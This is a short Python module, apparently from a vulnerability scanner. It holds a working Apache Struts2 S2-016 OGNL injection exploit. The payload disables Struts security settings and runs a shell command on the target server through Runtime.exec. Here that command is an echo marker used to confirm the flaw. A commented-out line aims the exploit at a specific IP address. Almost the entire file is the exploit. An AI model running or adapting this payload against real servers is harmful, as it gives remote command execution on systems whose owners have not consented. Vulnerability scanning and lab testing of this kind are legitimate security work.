import requests
# http://vulapps.evalbug.com/s_struts2_s2-016/
# url是IP
class Exploit:
    def attack(self, url):
        print('test {} --> struts2_016_2'.format(url))
        command = 'echo%20ILoveSke'
        exp = '/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{}%27%29.getInputStream%28%29%29%7D'.format(command)
        url += exp
        #print(url)
        try:
            resp = requests.get(url, timeout=10)
            #print(resp.text)
            if "ILoveSke" in resp.text:
                return "s2-016-2"
        except:
            #print('test --> struts2_016_2 Failed!')
            return None
#print(Exploit().attack('http://207.246.73.172:82/'))